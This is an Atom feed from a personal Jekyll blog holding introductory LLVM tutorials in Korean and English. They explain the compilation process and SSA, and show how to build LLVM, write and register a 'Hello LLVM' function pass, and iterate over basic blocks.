<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://dalnaracrater.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://dalnaracrater.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-08-29T14:46:17+00:00</updated><id>https://dalnaracrater.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">000 An Introduction to LLVM(KOR)</title><link href="https://dalnaracrater.github.io/blog/2024/000-Begining_LLVM(KOR)/" rel="alternate" type="text/html" title="000 An Introduction to LLVM(KOR)"/><published>2024-04-24T05:24:00+00:00</published><updated>2024-04-24T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2024/000-Begining_LLVM(KOR)</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2024/000-Begining_LLVM(KOR)/"><![CDATA[ <p>GPU의 등장으로 인공지능 연구에 엄청난 발전이 시작되었다. 스팸메일 탐지, MRI 영상 처리, 심지어는 잡초 이미지를 학습하여 농기구에 부착된 카메라를 통해 잡초를 인식하고 레이저로 제거하는 기술까지 모든 분야에서 인공지능 기술을 활용하고 있다. 또한 불과 2~3년 사이에 ChatGPT, LLaMa, Bard와 같은 트랜스포머(transformer) 기반의 모델은 이미 우리의 삶 어딘가에 자리잡기 시작했다. 잠깐! LLVM 튜토리얼 아니었나? 맞다! 근데 왜 갑자기 인공지능 이야기를 하는가? 왜냐하면 컴파일러 또한 인공지능과 관련이 있기 때문이다! 인공지능 모델 또한 결국 CPU, GPU, TPU에서 처리해야 하기 때문에 더 빠르고 최적화된 컴파일러를 필요로 한다. MLIR, XLA, Triton과 같이 특정 도메인에서 유용한 컴파일러 프레임워크가 등장하였으며, 이 프레임워크를 통해 딥러닝 모델의 학습을 가속화시킬 수 있다.<br/> LLVM은 좀 더 범용적으로 사용할 수 있는 컴파일러 프레임워크 중 하나이지만 다소 높은 진입 장벽을 갖고 있으며, 나 또한 이러한 장벽에 좌절을 했던 한 학생이었다. 하지만 이제는 제법 LLVM에 대해 잘 알고 있으며 이론으로만 배웠던 프로그램 분석 기법들이 어떻게 구현이 되고 적용되는지 알아냈다. 나는 나와 같은 어려움을 겪고 있는 학생들을 위해 간단한 튜토리얼을 작성해본다.</p> <p><em>본 튜토리얼에서는 프로그램 분석 기법을 LLVM을 통해 구현해보는 것이 목적이기 때문에 모든 이론적 지식을 자세하게 다루지는 않을 것이다.</em></p> <h2 id="llvm이란">LLVM이란?</h2> <p>LLVM은 프로그래밍 언어를 설계하고 최적화할 수 있게 해주는 컴파일러 도구이다. (Front-end) (Middle-end) 변환된 LLVM IR을 최적화하여 새로운 LLVM IR을 출력한다. (Back-end) 최적화된 IR 코드는 기계에 종속적인 실행 파일로 변환된다.</p> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>컴파일 과정에 대해 이해한다</li> <li>SSA 형태가 무엇인지 공부한다</li> <li>LLVM 프로젝트를 설치하고 빌드하는 방법을 알아본다</li> <li>LLVM Pass를 작성하는 법을 살펴본다.</li> <li>LLVM IR로 변환된 프로그램의 기본 구조를 살펴본다.</li> </ul> <h3 id="compilation-process">Compilation process</h3> <p>컴파일 과정을 이해하면 LLVM을 사용하는데 큰 도움이 된다. 흔히 빌드 과정과 컴파일 과정을 헷갈려하는데 이에 대해 간단하게 짚고 넘어가고자 한다.<br/> 먼저 빌드 과정을 살펴보자. 소스코드 빌드는 보통 전처리 -&gt; 컴파일 -&gt; 어셈블 -&gt; 링크 순서로 진행되어 최종적으로 프로그램이 실행될 기계에서 실행할 수 있는 실행파일이 생성된다. 우리가 앞으로 다루고자 하는 최적화는 빌드 과정의 컴파일에서 수행된다.</p> <p>다음은 컴파일 과정을 도식화한 그림이다.</p> <p>컴파일 과정은 크게 전단부와 후단부로 나뉘며 전단부를 좀 더 세밀하게 나누면 전단부와 중단부로 다시 나눌 수 있다. 전단부에서는 어휘분석, 구문분석, 의미분석을 수행하고, 중단부에서는 최적화를, 후단부에서는 기계어로의 변환 작업을 수행한다.</p> <ul> <li>Front-end: Convert a high level programming langauge into LLVM IR <ul> <li>Lexical analysis: Scan a source code and check whether it follows designated patterns by tokens. Return a series of tokens, otherwise omit an error.</li> <li>syntax analysis: Given a series of tokens, create a Abstract Syntax Tree (AST)</li> <li>semantic analysis: analyze a source code whether it has semantic errors or not. (e.g. Type check, Arithmetics) Return Abstract Syntax Tree (AST)</li> </ul> </li> <li>Middle-end: Optimize LLVM IR via LLVM Pass <ul> <li>optimization: optimize a source code.</li> </ul> </li> <li>Back-end: Translate a optimized IR into a machine dependent assembly language.</li> </ul> <h3 id="ssa">SSA</h3> <p>LLVM이 소스코드를 최적화하기 위해서는 gcc, llc와 같은 컴파일 도구를 이용해 소스코드를 LLVM IR로 변환해야 한다. 이때 LLVM IR은 Static Single Assignment (SSA) 형태를 따르는데, 이는 변수에 값이 오직 한번만 할당되고, 그 이후에는 그 변수를 읽는데만 사용할 수 있도록 한다. SSA 형태로 코드를 변환하면 코드 최적화에 도움이 되는데 이는 그래프 기반의 최적화와 같이 흐름 분석을 하는데 유용하기 때문이다.</p> <ul> <li>Fig</li> </ul> <p>자, 이제 LLVM에 대한 기본적인 개념을 소개했으니 어떻게 사용하는지 알아보도록 하자.</p> <h3 id="installing-llvm">Installing LLVM</h3> <p><a href="https://llvm.org/docs/GettingStarted.html">LLVM 공식 홈페이지</a>에서 LLVM 설치에 대한 더 자세한 설명이 있으니 참고하면 좋을 것 같다.</p> <h4 id="required-software">required software</h4> <p><code class="language-plaintext highlighter-rouge">CMake</code>: <code class="language-plaintext highlighter-rouge">brew install CMake</code><br/> <code class="language-plaintext highlighter-rouge">Ninja</code>: <code class="language-plaintext highlighter-rouge">brew install Ninja</code><br/> <code class="language-plaintext highlighter-rouge">Clang</code>: <code class="language-plaintext highlighter-rouge">brew install Clang</code></p> <h4 id="clone-git">Clone Git</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/llvm/llvm-project.git llvm
cd llvm
</code></pre></div></div> <h4 id="build-llvm-project">Build LLVM project</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir build
cd build
ninja
</code></pre></div></div> <p>Ninja를 통해 프로젝트를 처음 빌드하게 되면 대략 30분 정도의 시간이 소요된다. 하지만 이후에 다시 빌드를 하게 되면 몇 분 내외로 빌드가 완료되니 걱정하지 말자.</p> <p>빌드된 llvm의 실행파일을 손쉽게 사용하기 위해 실행환경을 수정해 준다. <em>(프로그램이 실행되지 않을 때 뿐만 아니라 LLVM 패스를 작성할 때 라이브러리가 인식이 안되는 문제도 해결해준다.)</em></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export PATH=$PATH:~/llvm/build/bin/
</code></pre></div></div> <h4 id="compile-a-source-code-into-ll-or-bc">Compile a source code into *.ll or *.bc</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clang -emit-llvm -S test.cpp -o test.ll
</code></pre></div></div> <h3 id="writing-an-llvm-pass">Writing an LLVM Pass</h3> <p>처음으로 만들어 볼 패스는 “Hello LLVM!”을 출력하는 Hello 패스이다.</p> <ol> <li>우선 LLVM 패스 파일을 위한 <code class="language-plaintext highlighter-rouge">HelloLLVM</code> 디렉토리를 <code class="language-plaintext highlighter-rouge">./llvm/llvm/lib/Transforms/</code>에 만들자.</li> </ol> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir HelloLLVM
cd HelloLLVM
</code></pre></div></div> <h6 id="주의-현재-우리가-위치한-디렉토리는-llvmllvmlibtransformshellollvm이고-패스-파일을-빌드하면-llvmbuildlib에-빌드된-패스가-생성된다"><em>주의. 현재 우리가 위치한 디렉토리는 <code class="language-plaintext highlighter-rouge">~/llvm/llvm/lib/Transforms/HelloLLVM/</code>이고 패스 파일을 빌드하면 <code class="language-plaintext highlighter-rouge">~/llvm/build/lib/</code>에 빌드된 패스가 생성된다</em></h6> <p>패스를 작성하기 위해서는 빌드를 위한 <code class="language-plaintext highlighter-rouge">CMakeLists.txt</code>와 LLVM 소스코드 파일, <code class="language-plaintext highlighter-rouge">HelloLLVM.cpp</code>이 필요하다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>touch CMakeLists.txt
touch HelloLLVM.cpp
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">CMakeLists.txt</code> 파일에 들어갈 내용은 다음과 같다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add_llvm_library(HELLO MODULE
    HELLO.cpp
    
    PLUGIN_TOOL
    OPT)
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">Transforms</code> 디렉토리에 위치한 <code class="language-plaintext highlighter-rouge">CMakeLists.txt</code>에도 맨 마지막에 <code class="language-plaintext highlighter-rouge">add_subdirectory(HelloLLVM)</code>을 추가해주자.</p> <p>자 이제 진정한 LLVM Pass를 작성해보자!</p> <h4 id="library-header">library header</h4> <p>우리가 작성하려는 <strong>패스</strong> 파일은 소스코드를 <strong>함수 단위</strong>로 분석하고 이때 “Hello LLVM!”을 <strong>출력</strong>하는 것이다. 따라서 이에 맞게 사용할 라이브러리는 다음과 같다.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span></code></pre></div></div> <p>llvm은 이름공간을 사용하므로 편의를 위해 다음을 선언해주자.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>
</code></pre></div></div> <p>다음으로는 새로운 이름 공간 안에 FunctionPass를 상속받는 HelloLLVM 구조체를 선언하자. 이 구조체의 멤버 함수가 실질적인 최적화 작업을 수행할 것이다.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span><span class="p">{</span>
    <span class="k">struct</span> <span class="nc">HelloLLVM</span><span class="o">:</span> <span class="k">public</span> <span class="n">FunctionPass</span><span class="p">{</span>
        <span class="c1">// You will write a Pass here! </span>
    <span class="p">};</span>
<span class="p">}</span>
</code></pre></div></div> <p>llvm은 패스마다 고유의 <code class="language-plaintext highlighter-rouge">ID</code>가 있기 때문에 <code class="language-plaintext highlighter-rouge">ID</code>를 스태틱 변수로 선언해준다. <code class="language-plaintext highlighter-rouge">FunctionPass</code>의 생성자를 통해 고유한 ID값을 갖게 하고 다른 패스들과 구분할 수 있게 만들어준다.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
<span class="n">HelloLLVM</span><span class="p">()</span> <span class="o">:</span> <span class="n">FunctionPass</span><span class="p">(</span><span class="n">ID</span><span class="p">)</span> <span class="p">{}</span>
</code></pre></div></div> <p>소스코드를 함수 단위로 분석하기 위해 <code class="language-plaintext highlighter-rouge">bool runOnFunction()</code> 함수를 재정의(override)한다. 이 함수는 소스코드를 변경했으면 <code class="language-plaintext highlighter-rouge">true</code>를 아니면 <code class="language-plaintext highlighter-rouge">false</code>를 반환한다.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="nf">runOnFunction</span><span class="p">(</span><span class="n">Function</span><span class="o">&amp;</span> <span class="n">F</span><span class="p">){</span>
    <span class="c1">// this code optimize a given source code over the function F.</span>

    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">C</code>언어의 <code class="language-plaintext highlighter-rouge">printf</code>, <code class="language-plaintext highlighter-rouge">C++</code>의 <code class="language-plaintext highlighter-rouge">cout</code>과 같이 llvm에서는 <code class="language-plaintext highlighter-rouge">errs()</code>를 출력 스트림으로 사용한다.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"Hello LLVM!"</span><span class="p">;</span>
</code></pre></div></div> <p>We will write an LLVM Pass and this pass run over functions in a program. To print ‘Hello LLVM!’ out, we need to specify which stream we use. In this case, the output stream is <code class="language-plaintext highlighter-rouge">errs()</code></p> <p>In llvm, a pass has an unique ID so we define <code class="language-plaintext highlighter-rouge">char ID</code> as static.</p> <p>최적화를 위한 패스를 완성하였다. 이제는 이 패스를 등록하는 일만 남았다. 먼저 패스의 <code class="language-plaintext highlighter-rouge">ID</code>를 <code class="language-plaintext highlighter-rouge">0</code>으로 설정해주고(아무런 의미가 없기 때문), <code class="language-plaintext highlighter-rouge">RegisterPass</code>를 통해 패스를 등록한다. llvm에서는 패스가 고유의 ID를 갖지만, 이 고유성은 <code class="language-plaintext highlighter-rouge">ID</code>가 <code class="language-plaintext highlighter-rouge">0</code>값을 갖을 때 할당되는 메모리 공간을 통해 다른 패스들과 구분되게 한다.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">HelloLLVM</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">HelloLLVM</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"PrintHello"</span><span class="p">,</span> <span class="s">"Print Hello LLVM!"</span><span class="p">,</span>
                            <span class="nb">false</span> <span class="cm">/* Only looks at CFG */</span><span class="p">,</span>
                            <span class="nb">false</span> <span class="cm">/* Analysis Pass */</span><span class="p">);</span>
</code></pre></div></div> <p>위 방식은 <strong>legacy Pass Manager</strong>를 통해 패스를 등록한 것이다. 이 방식은 스케줄링, 메모리 관리 등에 여러 불편함이 있었는데 이를 해소하기 위해 <strong>New Pass Manager</strong>가 등장했다. 그래서 최근에는 이 <strong>New Pass Manger</strong>를 통해 패스를 등록하는 추세이다.</p> <p>자 이제 패스 파일을 완성했으니 빌드하고 실제 코드에 적용해보자.</p> <p>먼저 <code class="language-plaintext highlighter-rouge">Ninja</code>를 통해 llvm을 빌드한다. 첫 빌드와 달리 단 몇 십 초만에 빌드가 끝난다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd ~/llvm/build/
ninja
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">hello.cpp</code> 파일이 있는 <code class="language-plaintext highlighter-rouge">~/llvm/testcases/</code>로 이동하자. <em>(다른 곳에서 실행해도 된다.)</em></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd ~/llvm/testcases/
clang -emit-llvm -S hello.cpp -o hello.ll
opt -load ../build/lib/HelloLLVM.so &lt; hello.ll &gt; /dev/null
</code></pre></div></div> <p>혹시 <code class="language-plaintext highlighter-rouge">HelloLLVM.so</code>가 없는가? 운영체제에 따라 생성되는 파일이 다르니 다시 한번 살펴보자. 필자는 Mac OS를 사용하기 때문에 <code class="language-plaintext highlighter-rouge">*.dylib</code>가 생성된다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello LLVM!
</code></pre></div></div> <p>자 방금 “Hello LLVM!”을 터미널에 출력하였다. 이는 hello.ll 파일을 최적화 하는 과정에서 해당 메시지를 출력한 것이다. LLVM의 세계에 온 것을 환영한다!</p> <h4 id="full-code">Full code</h4> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">HelloLLVM</span> <span class="o">:</span> <span class="k">public</span> <span class="n">FunctionPass</span> <span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>

        <span class="n">HelloLLVM</span><span class="p">()</span> <span class="o">:</span> <span class="n">FunctionPass</span><span class="p">(</span><span class="n">ID</span><span class="p">)</span> <span class="p">{}</span>

        <span class="kt">bool</span> <span class="n">runOnFunction</span><span class="p">(</span><span class="n">Function</span> <span class="o">&amp;</span><span class="n">F</span><span class="p">)</span> <span class="k">override</span> <span class="p">{</span>
            <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"Hello LLVM!"</span><span class="p">;</span>
            <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span> <span class="c1">// end of struct</span>
<span class="p">}</span>  <span class="c1">// end of anonymous namespace</span>

<span class="kt">char</span> <span class="n">HelloLLVM</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">HelloLLVM</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"PrintHello"</span><span class="p">,</span> <span class="s">"Print Hello LLVM!"</span><span class="p">,</span>
                            <span class="nb">false</span> <span class="cm">/* Only looks at CFG */</span><span class="p">,</span>
                            <span class="nb">false</span> <span class="cm">/* Analysis Pass */</span><span class="p">);</span>
</code></pre></div></div> <h3 id="llvm-structure">LLVM structure</h3> <ul> <li>Module</li> <li>Function</li> <li>BasicBlock</li> <li>Instruction</li> </ul> <p>HelloLLVM 패스는 각 함수마다 최적화(“Hello LLVM!” 출력하기)를 수행한다. 이렇듯 최적화 패스를 작성하기 위해서는 LLVM IR의 구조를 알아야 하는데 위 그림에서와 같이 크게 <code class="language-plaintext highlighter-rouge">Module</code>, <code class="language-plaintext highlighter-rouge">Function</code>, <code class="language-plaintext highlighter-rouge">BasicBlock</code>, <code class="language-plaintext highlighter-rouge">Instruction</code>으로 나눌 수 있다. <code class="language-plaintext highlighter-rouge">Instruction</code>이 모여 <code class="language-plaintext highlighter-rouge">BasicBlock</code>을 구성하고, <code class="language-plaintext highlighter-rouge">BasicBlock</code>이 모여 <code class="language-plaintext highlighter-rouge">Function</code>을 구성한다. 마지막으로 <code class="language-plaintext highlighter-rouge">Function</code>이 모여 <code class="language-plaintext highlighter-rouge">Module</code>을 구성한다. 각 구조는 <code class="language-plaintext highlighter-rouge">loop statement</code>를 통해 탐색할 수 있으며 이는 다음에 알아보도록 하자.</p> <h3 id="pass-manager">Pass Manager</h3> <p>Legacy pass manager은</p> <h4 id="legacy-pass-manager">Legacy pass manager</h4> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">llvmPass000</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">llvmPass000</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"command"</span><span class="p">,</span> <span class="s">"description"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</code></pre></div></div> <h4 id="new-pass-manager">New pass manager</h4> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div> <h3 id="analysis-vs-transformation">Analysis vs Transformation</h3> <p><strong>프로그램 분석(Program analysis)</strong>은 프로그램을 수정하지 않는 선에서 수행할 수 있는 분석 기법을 말한다. 이러한 분석은 정의하지 않는 행위(undefined behavior)를 찾아내는데 자주 사용되며, 포인터 오용(misuse of pointer), 사용하지 않는 변수 찾기(unused variable), 메모리 참조(memory reference) 등이 있다.<br/> 반면에 <strong>프로그램 변환(Program transform)</strong>은 프로그램을 조사하는 것 뿐만 아니라, 프로그램을 수정하여 올바르게 동작하도록 하거나, 같은 동작을 수행하지만 좀 더 빨르게 해주는 최적화 작업에 사용한다. 죽은 코드 제거(dead code elimination), 상수 전파(constant propagation) 등이 프로그램 변환의 예시라 할 수 있다.</p> <p>프로그램 분석을 위해서는 호출 그래프(call graph)를 탐색하거나, 때로는 명령어를 다른 명령어로 변환하는 작업을 수행해야 한다. 이를 위해서는 LLVM IR을 잘 다룰 수 있어야 하는데, 아래 표는 LLVM IR을 다룰 수 있는 여러 방법들을 설명해주고 있으니 좀 더 살펴보도록 하자.</p> <table> <thead> <tr> <th>Pass</th> <th>Type</th> </tr> </thead> <tbody> <tr> <td><a href="../000-Begining_LLVM(KOR)">Writing HelloLLVM Pass</a></td> <td>analysis</td> </tr> <tr> <td><a href="../001-Iterating_over_Module_Function_BasicBlock">Iterating over Module, Function, Basic block</a></td> <td>analysis</td> </tr> <tr> <td><a href="../002-Count_insts_calls">Count the number of insts, func calls</a></td> <td>analysis</td> </tr> <tr> <td><a href="../003-Insert_func_call">Insert func call</a></td> <td>transformation</td> </tr> <tr> <td><a href="../004-Change_Insts_(obfuscation)">Change Insts (obfuscation)</a></td> <td>transformation</td> </tr> <tr> <td><a href="../005-Traverse_CFG">Control flow graph</a></td> <td>transformation</td> </tr> </tbody> </table> <p>LLVM 튜토리얼을 잘 즐기셨나요? 이제는 프로그램 분석에 대해 알아보도록 합시다! <a href="./101-Program_analysis_with_LLVM">여기</a>로 오세요!</p> <h2 id="reference">Reference</h2> <p>[1] Andrzej Warzyński. llvm-tutor. <a href="https://github.com/banach-space/llvm-tutor">github</a><br/> [2] Adrian Sampson. LLVM for Grad Students. <a href="https://www.cs.cornell.edu/~asampson/blog/llvm.html">blog</a><br/> [3] Keshav Pingali. CS 380C: Advanced Topics in Compilers. <a href="https://www.cs.utexas.edu/~pingali/CS380C/2020/assignments/assignment4/index.html">blog</a><br/> [4] Arthur Eubanks. The New Pass Manager. <a href="https://blog.llvm.org/posts/2021-03-26-the-new-pass-manager">blog</a> [5] Changbie. Compilation Optimization: LLVM Code Generation Technology Details and Its Application in Databases. <a href="https://www.alibabacloud.com/blog/compilation-optimization-llvm-code-generation-technology-details-and-its-application-in-databases_598408">post</a></p>]]></content><author><name></name></author><category term="LLVM"/><summary type="html"><![CDATA[LLVM]]></summary></entry><entry><title type="html">000 An Introduction to LLVM</title><link href="https://dalnaracrater.github.io/blog/2024/000-Begining_LLVM/" rel="alternate" type="text/html" title="000 An Introduction to LLVM"/><published>2024-04-24T05:24:00+00:00</published><updated>2024-04-24T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2024/000-Begining_LLVM</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2024/000-Begining_LLVM/"><![CDATA[ <p><em>In this tutorials, I will not go through all of theoritical concepts in comiler construction and optimization since the purpose of this article is to provide an introcution to LLVM and implement program analysis from scratch.</em> <em>한국어 번역은 <a href="">여기</a>에서 보실 수 있습니다.</em></p> <h1 id="llvm">LLVM</h1> <ul> <li>SSA With LLVM, you can create your own language, optimize a code before translating it into machine code. LLVM IR (Intermediate Representation) is an representation in the middle of source code and machine so that it can be used for optimization.</li> </ul> <h2 id="compilation-process">Compilation process</h2> <p>다음은 컴파일 과정을 도식화한 그림이다. LLVM은 AST 로 생성된 IR을 통해 최적화를 수행한다.</p> <ul> <li>Lexical analysis</li> <li>semantic analysis</li> <li>optimization</li> </ul> <h2 id="installation">Installation</h2> <ul> <li>download: github</li> <li>build: 간단한 빌드</li> </ul> <h2 id="writing-an-llvm-pass">Writing an LLVM Pass</h2> <ol> <li>Create a Pass folder at <code class="language-plaintext highlighter-rouge">./lib/Transformation</code></li> </ol> <ul> <li>print hello world</li> </ul> <details open=""> <summary>Code</summary> <br/> ```cpp #include "llvm/Pass.h" #include "llvm/IR/Function.h" #include "llvm/Support/raw_ostream.h" using namespace llvm; namespace { struct HelloLLVM : public FunctionPass { static char ID; HelloLLVM() : FunctionPass(ID) {} bool runOnFunction(Function &amp;F) override { errs() &lt;&lt; "Hello LLVM!"; return false; } }; // end of struct } // end of anonymous namespace char HelloLLVM::ID = 0; static RegisterPass<HelloLLVM> X("PrintHello", "Print Hello LLVM!", false /* Only looks at CFG */, false /* Analysis Pass */); ``` &lt;/details&gt; We just printed 'Hello LLVM!' on your Terminal! But we don't know how it works yet. - header ```cpp #include "llvm/Pass.h" #include "llvm/IR/Function.h" #include "llvm/Support/raw_ostream.h" ``` We will write an LLVM Pass and this pass run over functions in a program. To print 'Hello LLVM!' out, we need to specify which stream we use. In this case, the output stream is `errs()` In llvm, a pass has an unique ID so we define `char ID` as static. After defining struct for a pass, we need to register the pass: `static RigisterPass<YourPass> VarName("OptionName", "Description", "false", "false")`. This way of registering a pass is called a *legacy pass*. Nowadays, New Pass Manager is used more often. ## LLVM structure - Module - Function - BasicBlock - Instruction HelloLLVM 패스는 각 함수마다 최적화("Hello LLVM!" 출력하기)를 수행한다. 이렇듯 최적화 패스를 작성하기 위해서는 LLVM IR의 구조를 알아야 하는데 위 그림에서와 같이 크게 `Module`, `Function`, `BasicBlock`, `Instruction`으로 나눌 수 있다. `Instruction`이 모여 `BasicBlock`을 구성하고, `BasicBlock`이 모여 `Function`을 구성한다. 마지막으로 `Function`이 모여 `Module`을 구성한다. 각 구조는 `loop statement`를 통해 탐색할 수 있으며 이는 다음에 알아보도록 하자. ## Pass Manager ### Legacy pass manager ```cpp char llvmPass000::ID = 0; static RegisterPass<llvmPass000> X("command", "description", false, false); ``` ### New pass manager ```cpp ``` ## Analysis vs Transformation **Program analysis** invests program whether they have undefined behavior such as misuse of pointer, unused variables, memeory reference, etc. This does not change a target source code but look at it and alarm to users. On the other hand, **program transformation** not only search the source code but also optimize it by removing unnecessary code snipet or converting it into more efficient code. A table shown below links to other pages for supplimental analysis and transformation. You can follow the links to dive into LLVM pass. |Pass|Type| |---|---| |[Writing HelloLLVM Pass](../000-Begining_LLVM)|analysis| |[Iterating over Module, Function, Basic block](../Iterating_over_Module_Function_BasicBlock)|analysis| |[Count the number of insts, func calls](../002-Count_insts_calls)| analysis| |[Insert func call](../003-Insert_func_call)|transformation| |[Change Insts (obfuscation)](../004-Change_Insts_(obfuscation))|transformation| |[Control flow graph](../005-Traverse_CFG)|transformation| ### Did you enjoy the LLVM tutorial? Now it's time to study **program analysis**. [here!](./2024-03-14-101-Program_analysis_with_LLVM%20copy.md) ## Reference [1] Andrzej Warzyński. llvm-tutor. [github](https://github.com/banach-space/llvm-tutor)\ [2] Adrian Sampson. LLVM for Grad Students. [blog](https://www.cs.cornell.edu/~asampson/blog/llvm.html)\ [3] Keshav Pingali. CS 380C: Advanced Topics in Compilers. [blog](https://www.cs.utexas.edu/~pingali/CS380C/2020/assignments/assignment4/index.html)\ [4] Arthur Eubanks. The New Pass Manager. [blog](https://blog.llvm.org/posts/2021-03-26-the-new-pass-manager) </llvmPass000></YourPass></HelloLLVM></details>]]></content><author><name></name></author><category term="LLVM"/><summary type="html"><![CDATA[LLVM]]></summary></entry><entry><title type="html">001 Iterating Module, Function, and Basicblock with LLVM</title><link href="https://dalnaracrater.github.io/blog/2024/001-Iterating_over_Module_Function_BasicBlock/" rel="alternate" type="text/html" title="001 Iterating Module, Function, and Basicblock with LLVM"/><published>2024-04-24T05:24:00+00:00</published><updated>2024-04-24T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2024/001-Iterating_over_Module_Function_BasicBlock</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2024/001-Iterating_over_Module_Function_BasicBlock/"><![CDATA[ <h1 id="iterating-function-basicblock-and-instruction-with-llvm">Iterating Function, Basicblock, and Instruction with LLVM</h1> <p>As we discussed previous <a href="../000-Begining_LLVM(KOR)">post</a>, LLVM Structure consists of Modules, functions, basicblocks, and instructions. Therefore, we can search for one of them through its super set. For example, if you are looking for an <code class="language-plaintext highlighter-rouge">add</code> instruction, you can find it by investigating BasicBlocks.</p> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>Learn how to iterate LLVM structures(Module, Function, BasicBlock, Instruction)</li> </ul> <h3 id="llvm">LLVM</h3> <h3 id="iterating-over-functions">Iterating over Functions</h3> <h3 id="iterating-over-basicblocks">Iterating over Basicblocks</h3> <p><code class="language-plaintext highlighter-rouge">llvm/IR/BasicBlock.h</code> header is deprecated. So you may include <code class="language-plaintext highlighter-rouge">Function.h</code> or <code class="language-plaintext highlighter-rouge">Module.h</code> when you iterate BasicBlocks.</p> <p>You can iterate BasicBlocks in a function F.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="n">BasicBlock</span> <span class="o">&amp;</span><span class="n">BB</span><span class="o">:</span> <span class="n">F</span><span class="p">){</span>
    <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"Start BB: "</span> <span class="o">&lt;&lt;</span> <span class="n">BB</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="sc">' '</span> <span class="o">&lt;&lt;</span> <span class="n">BB</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>
<span class="p">}</span>
